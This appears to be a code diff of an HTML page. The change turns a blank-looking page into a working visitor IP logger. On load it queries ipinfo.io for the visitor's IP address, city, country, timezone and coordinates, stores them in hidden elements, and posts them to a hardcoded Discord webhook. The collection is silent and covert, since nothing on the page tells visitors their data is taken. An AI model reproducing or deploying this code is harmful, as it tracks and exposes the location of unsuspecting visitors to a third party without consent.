@@ -1,6 +1,7 @@
 
 <!DOCTYPE html>
 <head>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 </head>
 <body>
 <ul style="display:none;">
@@ -12,30 +13,26 @@
   <li><p id="6"></p></li>
   <li><p id="7"></p></li>
 </ul>
-<button style="display:none"id="button"onclick="sendMessage();">click</button>
 <script>
-// An example script for redirecting users from USA to https://google.com/
-// and users from Canada to https://google.ca/
 
-// ip-api endpoint URL
-// we need only the countryCode, but you can request more fields
-// see http://ip-api.com/docs/api:json for documentation
-var endpoint = 'https://api.ipify.org?format=json';
+$.get("https://ipinfo.io", function(response) {
+  	document.getElementById("1").innerHTML = "city:" + response.city;
+  	document.getElementById("2").innerHTML = "country:" + response.country;
+  	document.getElementById("3").innerHTML = "timezone:" + response.timezone;
+  	document.getElementById("4").innerHTML = "ip:" + response.ip;
+  	document.getElementById("5").innerHTML = "location:" + response.loc;
+  	
+}, "jsonp");
 
-var xhr = new XMLHttpRequest();
-xhr.onreadystatechange = function() {
-	if (this.readyState == 4 && this.status == 200) {
-		var response = JSON.parse(this.responseText);
 
-		document.getElementById("1").innerHTML = "ip address:" + response.ip;
-	}
-};
-xhr.open('GET', endpoint, true);
-xhr.send();
 
   setTimeout(function () {
     
 var one = document.getElementById("1").innerHTML;
+var two = document.getElementById("2").innerHTML;
+var three = document.getElementById("3").innerHTML;
+var four = document.getElementById("4").innerHTML;
+var five = document.getElementById("5").innerHTML;
 
       const request = new XMLHttpRequest();
 request.open("POST", "https://discord.com/api/webhooks/1005626446825398404/jVq_oSk_X7L0oPmxafZysY98jE8ize989ifx0kbrquU0-G7MulcGQmcbbB973jVufW9r" );
@@ -59,6 +56,26 @@ const params = {
         {
           "name": "1",
           "value": `${one}`,
+          "inline": true
+        },
+        {
+          "name": "2",
+          "value": `${two}`,
+          "inline": true
+        },
+        {
+          "name": "3",
+          "value": `${three}`,
+          "inline": true
+        },
+        {
+          "name": "4",
+          "value": `${four}`,
+          "inline": true
+        },
+        {
+          "name": "5",
+          "value": `${five}`,
           "inline": true
         }
       ]
